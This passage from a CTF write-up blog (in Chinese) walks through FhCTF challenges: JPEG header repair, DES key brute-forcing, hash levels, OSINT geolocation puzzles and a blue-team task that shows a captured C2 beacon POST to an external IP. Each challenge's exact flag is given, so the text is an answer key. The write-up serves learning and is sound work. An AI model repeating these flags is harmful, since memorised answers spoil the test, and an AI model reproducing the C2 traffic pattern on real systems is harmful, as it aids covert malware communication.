bytes) 和精度 (1 byte)</span></span><br><span class="line">    h_idx = sof_pos + <span class="number">5</span>  <span class="comment"># 高度位置</span></span><br><span class="line">    w_idx = sof_pos + <span class="number">7</span>  <span class="comment"># 寬度位置</span></span><br><span class="line"></span><br><span class="line">    h = struct.unpack(<span class="string">&quot;&gt;H&quot;</span>, data[h_idx:h_idx+<span class="number">2</span>])[<span class="number">0</span>]</span><br><span class="line">    w = struct.unpack(<span class="string">&quot;&gt;H&quot;</span>, data[w_idx:w_idx+<span class="number">2</span>])[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> w &gt; max_width:  <span class="comment"># 找出寬度最大的區塊</span></span><br><span class="line">        max_width = w</span><br><span class="line">        target_idx = h_idx</span><br></pre></td></tr></table></figure><p><code>&gt;H</code> 表示 Big-Endian Unsigned Short，符合 JPEG 規範 。主圖片通常具有最大的寬度尺寸</p><p>C. 修改高度並儲存</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">new_height = <span class="number">2000</span>  <span class="comment"># 設定為足夠大的高度</span></span><br><span class="line">data[target_idx:target_idx+<span class="number">2</span>] = struct.pack(<span class="string">&quot;&gt;H&quot;</span>, new_height)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;treasuremap_fixed.jpg&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(data)</span><br></pre></td></tr></table></figure><p>成功修復後，開啟圖片即可看到底部隱藏的資訊，包括：</p><ul><li><code>plaintext.enc</code> 檔案提示</li><li>部分 Key 提示：<code>r5K9</code></li></ul><p><img src="/img/FhCTF/34.webp" alt="{6ED9B10C-BFBE-4518-B8C4-EF7B5ABA8D9F}"></p></li></ul></li><li><p>Part 2: DES 密鑰爆破 (Cryptography)</p><ul><li><p>題目背景</p><p><strong>加密演算法</strong>: DES (Data Encryption Standard)<br><strong>輸入檔案</strong>: <code>plaintext.enc</code> (hex 編碼的密文)<br><strong>已知資訊</strong>:</p><ul><li>題目提示：”<strong>The Data</strong> 可以幫你加速解密”</li><li>地圖右下角紅字：<code>key 部分：r5K9</code></li></ul></li><li><p>加密模式判斷</p><p>檢查 <code>plaintext.enc</code> 特徵：</p><ol><li>Hex 字串長度為偶數 → 可轉換為 bytes</li><li>轉換後長度是 8 的倍數 → 符合 DES block size</li></ol><p>由於題目未提供 IV (Initialization Vector)，且這是入門級 CTF 題目，推測使用 <strong>DES-ECB 模式</strong> 。[3]</p><p><strong>ECB 特性</strong>：</p><ul><li>不需要 IV</li><li>每個 block 獨立加密&#x2F;解密</li><li>相同明文 block 產生相同密文 block[3]</li></ul></li><li><p>密鑰結構分析</p><p>DES 密鑰固定為 <strong>8 bytes</strong>。<br>已知前 4 bytes：<code>r5K9</code><br>未知後 4 bytes：需要爆破</p><p><strong>字元集</strong>: 英文大小寫 + 數字 &#x3D; 62 個字元<br><strong>組合數</strong>: 62^4 &#x3D; 14,776,336 種可能</p></li></ul></li><li><p>加速策略</p><p>題目提示 “The Data can help you decrypt faster” 意味著：</p><ul><li>不需要解密整個檔案</li><li>只解密<strong>第一個 block (8 bytes)</strong> 即可驗證密鑰正確性</li><li>利用已知明文攻擊 (Known-Plaintext Attack) 的概念</li></ul></li><li><p>解題腳本</p><p>爆破版本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"></span><br><span class="line"><span class="comment"># 讀取 hex 密文</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;plaintext.enc&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ct_hex = f.read().strip()</span><br><span class="line">ct = binascii.unhexlify(ct_hex)</span><br><span class="line"></span><br><span class="line">prefix = <span class="string">b&quot;r5K9&quot;</span></span><br><span class="line">charset = (string.ascii_letters + string.digits).encode()</span><br><span class="line">ct0 = ct[:<span class="number">8</span>]  <span class="comment"># 只取第一個 block</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_printable</span>(<span class="params">bs: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span>(<span class="number">32</span> &lt;= b &lt; <span class="number">127</span> <span class="keyword">or</span> b <span class="keyword">in</span> (<span class="number">10</span>, <span class="number">13</span>, <span class="number">9</span>) <span class="keyword">for</span> b <span class="keyword">in</span> bs)</span><br><span class="line"></span><br><span class="line">found = <span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> suf <span class="keyword">in</span> itertools.product(charset, repeat=<span class="number">4</span>):</span><br><span class="line">    key = prefix + <span class="built_in">bytes</span>(suf)</span><br><span class="line">    cipher = DES.new(key, DES.MODE_ECB)</span><br><span class="line">    pt0 = cipher.decrypt(ct0)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> is_printable(pt0) <span class="keyword">and</span> pt0.startswith(<span class="string">b&quot;Here is&quot;</span>):</span><br><span class="line">        found = key</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Key found: <span class="subst">&#123;key.decode(errors=<span class="string">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Key not found&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用找到的密鑰解密完整檔案</span></span><br><span class="line">cipher = DES.new(found, DES.MODE_ECB)</span><br><span class="line">pt = cipher.decrypt(ct)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 移除 PKCS7 padding</span></span><br><span class="line">pad = pt[-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="number">1</span> &lt;= pad &lt;= <span class="number">8</span> <span class="keyword">and</span> pt.endswith(<span class="built_in">bytes</span>([pad]) * pad):</span><br><span class="line">    pt = pt[:-pad]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;plaintext.dec.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(pt)</span><br></pre></td></tr></table></figure><p><strong>執行結果</strong>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[+] Key found: r5K9zXxv</span><br></pre></td></tr></table></figure><p>直接解密版本</p><p>若已知完整密鑰，可直接解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;plaintext.enc&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = binascii.unhexlify(f.read().strip())</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&quot;r5K9zXxv&quot;</span></span><br><span class="line">cipher = DES.new(key, DES.MODE_ECB)</span><br><span class="line">plain = cipher.decrypt(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 移除 padding</span></span><br><span class="line">pad = plain[-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="number">1</span> &lt;= pad &lt;= <span class="number">8</span> <span class="keyword">and</span> plain.endswith(<span class="built_in">bytes</span>([pad]) * pad):</span><br><span class="line">    plain = plain[:-pad]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;plaintext.dec.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(plain)</span><br></pre></td></tr></table></figure><ul><li>結果</li></ul><p>成功解密後的 <code>plaintext.dec.txt</code> 內容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Here is your reward for finding the right key:</span><br><span class="line">FhCTF&#123;D0n7_c0un7_7h3_d4y5_m4k3_7h3_d4y5_c0un7&#125;</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;D0n7_c0un7_7h3_d4y5_m4k3_7h3_d4y5_c0un7&#125;</span><br></pre></td></tr></table></figure><h3 id="DES-Lv-2-–-再探老船長的寶藏（Write-up）"><a href="#DES-Lv-2-–-再探老船長的寶藏（Write-up）" class="headerlink" title="DES Lv.2 – 再探老船長的寶藏（Write-up）"></a>DES Lv.2 – 再探老船長的寶藏（Write-up）</h3><ul><li><p>題目描述與線索整理</p><p>題目提示：</p><ul><li>有一份加密資料（<code>plaintext.enc</code>）</li><li>上一題 key 曾出現 <code>r5K9zXxv</code></li><li>圖上還有 <code>r5K9</code>、<code>A.D.1688</code></li><li>並明確提示 <strong>“The Data.” 可以幫你加速解密</strong></li></ul><p>目標：解出密文內容，找到 GPS 座標或 Flag。</p></li><li><p>初步分析：密文格式與 DES 特徵</p><p>拿到 <code>plaintext.enc</code> 後先做格式判斷：</p><ul><li>檔案內容看起來像一長串 <strong>hex 字元</strong>（<code>0-9a-f</code>）</li><li>因此需先 <code>bytes.fromhex(...)</code> 才能得到真正密文 bytes</li><li>DES block size &#x3D; 8 bytes，因此密文長度應該是 8 的倍數（用於驗證資料合理性）</li></ul><p>程式中對應處理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;plaintext.enc&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ct = <span class="built_in">bytes</span>.fromhex(f.read().decode(<span class="string">&quot;ascii&quot;</span>).strip())</span><br></pre></td></tr></table></figure></li><li><p>攻擊策略：猜 mode&#x2F;IV + 爆破 key 結構</p><p>DES 題常見陷阱不是只在 key，而是：</p><ul><li><p>mode 可能是 ECB &#x2F; CBC &#x2F; CFB &#x2F; OFB…</p></li><li><p>CBC 需要 IV，IV 可能是：</p><ul><li>固定值（全 0）</li><li>由提示字串（例如 <code>&quot;The Data&quot;</code>）提供</li><li>直接放在密文前 8 bytes（<code>IV || CIPHERTEXT</code>）</li></ul></li><li><p>key 有可能不是你以為的 <code>r5K9????</code>，也可能是 <code>????r5K9</code></p></li></ul><p>因此本解法採用：</p><ul><li><p>(A) 同時測多種加密情境（schemes）</p><p>在 <code>try_dump()</code> 裡一次測四種最常見組合：</p><ol><li>CBC + IV &#x3D; <code>&quot;The Data&quot;</code></li><li>CBC + IV &#x3D; <code>00...00</code></li><li>CBC + IV &#x3D; <code>ct[:8]</code>（常見 <code>IV||C</code> 格式）</li><li>ECB（不需要 IV）</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">schemes = [</span><br><span class="line">    (<span class="string">&quot;CBC_IV_TheData&quot;</span>, DES.MODE_CBC, <span class="string">b&quot;The Data&quot;</span>, ct),</span><br><span class="line">    (<span class="string">&quot;CBC_IV_zeros&quot;</span>,   DES.MODE_CBC, <span class="string">b&quot;\x00&quot;</span>*<span class="number">8</span>,  ct),</span><br><span class="line">    (<span class="string">&quot;CBC_IV_prefix&quot;</span>,  DES.MODE_CBC, ct[:<span class="number">8</span>],     ct[<span class="number">8</span>:]),</span><br><span class="line">    (<span class="string">&quot;ECB&quot;</span>,            DES.MODE_ECB, <span class="literal">None</span>,       ct),</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li><li><p>(B) 同時測多種 key 結構（key structures）</p><p>由於圖上有 <code>r5K9</code>，上一題完整 key 有 <code>zXxv</code>（<code>r5K9zXxv</code>），因此假設 key 可能由固定 4 碼 + 可爆 4 碼組成。</p><p>測試兩個 base（可自行擴充）：</p><ul><li><code>base = b&quot;r5K9&quot;</code></li><li><code>base = b&quot;zXxv&quot;</code></li></ul><p>並對每個 base 測兩種拼法：</p><ul><li><code>base + suf</code> → <code>r5K9????</code></li><li><code>suf + base</code> → <code>????r5K9</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bases = [<span class="string">b&quot;r5K9&quot;</span>, <span class="string">b&quot;zXxv&quot;</span>]</span><br><span class="line"></span><br><span class="line">keys = [</span><br><span class="line">    base + suf,</span><br><span class="line">    suf + base,</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li></ul></li><li><p>爆破範圍（charset &#x2F; keyspace）</p><p>suffix 使用常見可見字元集合：</p><ul><li><code>a-zA-Z0-9</code> 加上一些常見符號 <code>_ - ! @ # .</code></li><li>目的：涵蓋 CTF 常用 key 風格，同時避免一次把 printable 全塞爆造成時間失控</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">charset = (string.ascii_letters + string.digits + <span class="string">&quot;_-!@#.&quot;</span>).encode()</span><br></pre></td></tr></table></figure><p>爆破 keyspace 約為：</p><ul><li>charset 長度 ≈ 67</li><li>suffix 4 碼 → <code>67^4 ≈ 20,151,121</code></li></ul></li><li><p>快速判斷是否解對（避免每把 key 解全文）</p><p>爆破最慢的地方不是「試 key」，而是「每把 key 都解完整密文」。<br>因此此解法採用<strong>快速過濾</strong>：</p><ul><li>(A) 只解前 64 bytes 當 head 做判斷</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">head = DES.new(key8, mode, iv=iv).decrypt(body[:<span class="number">64</span>])</span><br></pre></td></tr></table></figure><ul><li>(B) 判斷 head 是否像答案</li></ul><p>用兩種條件：</p><ol><li><strong>GPS regex 命中</strong></li><li><strong>可見字元比例高</strong></li></ol><ul><li><p>GPS regex</p><p>抓常見小數座標格式：</p><ul><li><code>25.0330,121.5654</code></li><li><code>-33.86 151.21</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gps_pat = re.<span class="built_in">compile</span>(<span class="string">rb&#x27;[-+]?\d&#123;1,3&#125;\.\d&#123;3,&#125;\s*[, ]\s*[-+]?\d&#123;1,3&#125;\.\d&#123;3,&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure></li><li><p>可見字元比例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">printable_ratio</span>(<span class="params">b: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">float</span>:</span><br><span class="line">    good = <span class="built_in">sum</span>(<span class="number">1</span> <span class="keyword">for</span> x <span class="keyword">in</span> b <span class="keyword">if</span> x <span class="keyword">in</span> <span class="string">b&quot;\n\r\t&quot;</span> <span class="keyword">or</span> <span class="number">32</span> &lt;= x &lt;= <span class="number">126</span>)</span><br><span class="line">    <span class="keyword">return</span> good / <span class="built_in">len</span>(b)</span><br></pre></td></tr></table></figure><p>當 <code>gps_pat.search(head)</code> 命中或 <code>printable_ratio(head) &gt; 0.92</code>，才會解全文。</p></li><li><p>找 Flag 的方式</p><p>若題目直接把 Flag 放在明文中，程式也會用 regex 搜尋：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag_pat = re.<span class="built_in">compile</span>(<span class="string">rb&#x27;FhCTF\&#123;[^&#125;]&#123;1,100&#125;\&#125;&#x27;</span>, re.I)</span><br></pre></td></tr></table></figure></li></ul></li><li><ol start="7"><li>執行方式（Windows &#x2F; PowerShell）</li></ol><ul><li>安裝套件</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python <span class="literal">-m</span> pip install pycryptodome</span><br></pre></td></tr></table></figure><ul><li>執行</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python slove.py</span><br></pre></td></tr></table></figure></li><li><ol start="8"><li>等待等待成功輸出判讀(大概很久</li></ol></li></ul><p>當找到候選 key，程式會印出：</p><ul><li>命中的 key 與 scheme</li><li>head 前 200 bytes</li><li>若有，印出 GPS &#x2F; Flag</li><li>以及 plaintext 前 500 bytes</li></ul><p>輸出如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*] brute forcing key structures...</span><br><span class="line"></span><br><span class="line">[+] HIT! key=b&#x27;r5K9bB2x&#x27;  scheme=CBC_IV_TheData</span><br><span class="line">[+] head: b&#x27;b4NKr3W8 Encryption Standard (DES) is a symmetric-key block ciph&#x27;</span><br><span class="line">[+] FLAG: b&#x27;FhCTF&#123;23.257735309160896_119.66758643893687&#125;&#x27;</span><br><span class="line">b&#x27;b4NKr3W8 Encryption Standard (DES) is a symmetric-key block cipher that operates on fixed-size blocks of data. DES processes data in 64-bit (8-byte) blocks and uses a 64-bit key, of which 56 bits are effective key material and the remaining 8 bits are used for parity checking. Because DES encrypts only one block at a time, it must be combined with a mode of operation to securely encrypt data longer than a single block.\r\n\r\nOne widely used mode is Cipher Block Chaining (CBC). In DES-CBC mode, each&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;23.257735309160896_119.66758643893687&#125;</span><br></pre></td></tr></table></figure><h3 id="管理員的密碼洋蔥"><a href="#管理員的密碼洋蔥" class="headerlink" title="管理員的密碼洋蔥"></a>管理員的密碼洋蔥</h3><p>3個level</p><ol><li>level 1 給 <code>md5 hash</code>，上網工具查解得到 <code>qwerty</code></li><li>level 2 個 <code>SHA-1</code>，但經過通靈，我們可以猜到 <code>admin</code> 這個答案</li><li>level 3 把 <code>base64</code> 轉成文字就行，得到 <code>FsCTF&#123;Happy Day&#125;</code></li></ol><p>最後就可以拿到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;CrYpt0_W3b_M4st3r_2025&#125;</span><br></pre></td></tr></table></figure><h2 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h2><h3 id="Art-Work"><a href="#Art-Work" class="headerlink" title="Art Work"></a>Art Work</h3><p>給了一張圖片:<br><img src="/img/FhCTF/35.webp" alt="image"><br>以圖搜圖我們會發現一個叫做「風之籽」的作品被展出於111.11.04-112.02.05的「2022屏東落山風藝術季」</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;屏東縣_落山風藝術季_1111104-1120205&#125;</span><br></pre></td></tr></table></figure><h3 id="Trace-the-Landmark"><a href="#Trace-the-Landmark" class="headerlink" title="Trace the Landmark"></a>Trace the Landmark</h3><p>給了三張圖片<br><img src="/img/FhCTF/36.webp" alt="photo-1"><br><img src="/img/FhCTF/37.webp" alt="photo-2"><br><img src="/img/FhCTF/38.webp" alt="photo-3"><br>用第三張來圖片搜尋找到了<strong>Piazza della Rotonda</strong>這個建築<br><img src="/img/FhCTF/39.webp" alt="image"><br>按照題目Hint排好後得到:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;Piazza_della_Rotonda_00186_Roma_RM_Italy&#125;</span><br></pre></td></tr></table></figure><h3 id="島1"><a href="#島1" class="headerlink" title="島1"></a>島1</h3><p>給了這張圖<br><img src="/img/FhCTF/40.webp" alt="land-1"><br>即使被打碼，還是可以大致看出是「新_廟口餐廳」<br>google搜尋後:<br><img src="/img/FhCTF/41.webp" alt="image"><br>找到餐廳後我就對著菜單和圖中的菜一一窮舉<br><img src="/img/FhCTF/42.webp" alt="37077136260_d855810352_c"><br>最後答案是原圖正中間的那道<strong>炒千佛手</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;新大廟口活海鮮_炒千佛手&#125;</span><br></pre></td></tr></table></figure><h3 id="The-FH-Gift"><a href="#The-FH-Gift" class="headerlink" title="The FH Gift"></a>The FH Gift</h3><p>一開始會出現 <code>malware_sample.eml</code> 點開來會發現:</p><p><img src="/img/FhCTF/43.webp" alt="image"></p><p>這個 salary_adjustment.docx 文件實際上不是 Word 文件，而是一個偽裝的 ZIP 壓縮檔 。通過檢查文件的魔術數字（前幾個 bytes），可以看到它以 PK\x03\x04 開頭，這是 ZIP 檔案的特徵標記。</p><p><img src="/img/FhCTF/44.webp" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;M1M3_Typ3s_C4n_B3_D3c3pt1v3&#125;</span><br></pre></td></tr></table></figure><h3 id="工商時間-1"><a href="#工商時間-1" class="headerlink" title="工商時間 1"></a>工商時間 1</h3><p>他給了以下圖片:<br><img src="/img/FhCTF/45.webp" alt="exhibition"></p><p>把他丟到 <a target="_blank" rel="noopener" href="https://www.metadata2go.com/">https://www.metadata2go.com/</a> ，可以得到以下資料:<br><img src="/img/FhCTF/46.webp" alt="image"></p><p>然後他的description是一個網站<br>點進去他會跳出來一個帶你到展覽網站的 按ok就會跳過去</p><p><img src="/img/FhCTF/47.webp" alt="2026-01-03_14.35.58"></p><p>可以看到<a target="_blank" rel="noopener" href="https://github.com/tschool-students/tschool-students.github.io">https://github.com/tschool-students/tschool-students.github.io</a></p><p>我們可以知道是「臺北市數位實驗高級中等學校學習分享會」</p><p><img src="/img/FhCTF/48.webp" alt="image"></p><p>2026.1.18 9:00 - 16:00~1.19 9:00 - 16:00 轉成 ISO 8601 格式是<br><code>2026-01-18T09:00_2026-01-19T16:00</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;T-SCHOOL_STUDENTS_EXPO&#x27;26_2026-01-18T09:00_2026-01-19T16:00&#125;</span><br></pre></td></tr></table></figure><h3 id="工商時間-2"><a href="#工商時間-2" class="headerlink" title="工商時間 2"></a>工商時間 2</h3><p>由 <code>工商時間 1</code>，我們可以從活動官網得知活動地點在 <code>臺北市中山區吉林路110號</code></p><p>我們把地址丟到Google Maps收尋，並複製座標貼上來:</p><p><img src="/img/FhCTF/49.webp" alt="截圖 2026-01-05 00.25.06"></p><h3 id="Lithium-exploration"><a href="#Lithium-exploration" class="headerlink" title="Lithium exploration"></a>Lithium exploration</h3><p><img src="/img/FhCTF/50.webp" alt="SalardeUyuni"></p><p>丟給AI</p><p>國家： 玻利維亞 (Bolivia)<br>湖泊名稱（鹽沼）： 烏尤尼鹽沼 (Salar de Uyuni)<br>生產礦物： 鋰 (Lithium)</p><p>原本是錯的<br>但後來改題目後就對了，很奇妙</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;Bolivia_SalardeUyuni_Lithium&#125;</span><br></pre></td></tr></table></figure><h3 id="SRL"><a href="#SRL" class="headerlink" title="SRL"></a>SRL</h3><p>給了以下圖片<br><img src="/img/FhCTF/51.webp" alt="SRL"><br>我們可以看到右方是大巨蛋後景有國父紀念館和台北101<br>所以我們可以推斷我們在:<br><img src="/img/FhCTF/52.webp" alt="image"></p><h3 id="島2"><a href="#島2" class="headerlink" title="島2"></a>島2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在清末民初年代，人們對麻瘋病（痲瘋病）所知有限，為了阻絕得病的患者，就把他們送到建功嶼上自生自滅，因此這座島被稱為「痲瘋礁」。患者被隔離在島上後，只能遙望金門本島，無法回家。</span><br></pre></td></tr></table></figure><p>by google AI 搜尋<br><img src="/img/FhCTF/53.webp" alt="image"><br><img src="/img/FhCTF/54.webp" alt="image"></p><h3 id="漂亮的圓頂-1"><a href="#漂亮的圓頂-1" class="headerlink" title="漂亮的圓頂 1"></a>漂亮的圓頂 1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">請通靈</span><br></pre></td></tr></table></figure><p><img src="/img/FhCTF/55.webp" alt="image"></p><h3 id="漂亮的圓頂-2"><a href="#漂亮的圓頂-2" class="headerlink" title="漂亮的圓頂 2"></a>漂亮的圓頂 2</h3><p>簡單搜尋 <code>免費船班 土耳其</code>，可以讓我們找到土耳其航空的這個頁面:</p><p><a target="_blank" rel="noopener" href="https://www.turkishairlines.com/zh-tw/flights/fly-different/touristanbul/">https://www.turkishairlines.com/zh-tw/flights/fly-different/touristanbul/</a></p><p><img src="/img/FhCTF/56.webp" alt="截圖 2026-01-05 00.40.35"></p><p>看Google Maps，可以發現我們的目的地，就正處於博斯普鲁斯海峽附近，我們可以驗證這是對的方向。</p><p>我們有了這些資訊 <code>T06 18:30-23:00 博斯普魯斯海峽之旅（4 月 1 日至 10 月 31 日期間營運）</code></p><p>通靈一下格式變成 flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;1830-2300_0401-1031&#125;</span><br></pre></td></tr></table></figure><h3 id="沒戴安全帽的騎士"><a href="#沒戴安全帽的騎士" class="headerlink" title="沒戴安全帽的騎士"></a>沒戴安全帽的騎士</h3><p><img src="/img/FhCTF/57.webp" alt="rider_without_helmet"></p><p>上網簡單圖片查資料，可知廠牌、車型，每個試一下，就能鎖定下答案。<br><img src="/img/FhCTF/58.webp" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;2014_Kymco_Many50&#125;</span><br></pre></td></tr></table></figure><h3 id="EXIF的「拍攝座標」"><a href="#EXIF的「拍攝座標」" class="headerlink" title="EXIF的「拍攝座標」"></a>EXIF的「拍攝座標」</h3><p>這題給的檔案出了點小問題，但就是 exif 完組合一下照片的經緯度通靈一下就好了。</p><h2 id="Blue-team"><a href="#Blue-team" class="headerlink" title="Blue team"></a>Blue team</h2><h3 id="大訂單"><a href="#大訂單" class="headerlink" title="大訂單"></a>大訂單</h3><ol><li>一組加密的十六進制字串: <code>775a20657e725a206725250925317172587b3774750d2132747f5a2631752251</code></li><li>網路封包的 hex dump,顯示 HTTP POST 請求</li></ol><p>檢查提供的封包內容,可以觀察到以下關鍵資訊:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /api/v1/config HTTP/1.1</span><br><span class="line">Host: 45.33.22.11</span><br><span class="line">User-Agent: C2-Client/1.0</span><br><span class="line">X-Auth-Token: FhCTF</span><br><span class="line">Content-Type: application/x-binary</span><br><span class="line"></span><br><span class="line">Target_ID: 775a20657e725a206725250925317172587b3774750d2132747f5a2631752251</span><br></pre></td></tr></table></figure><p>從封包中的 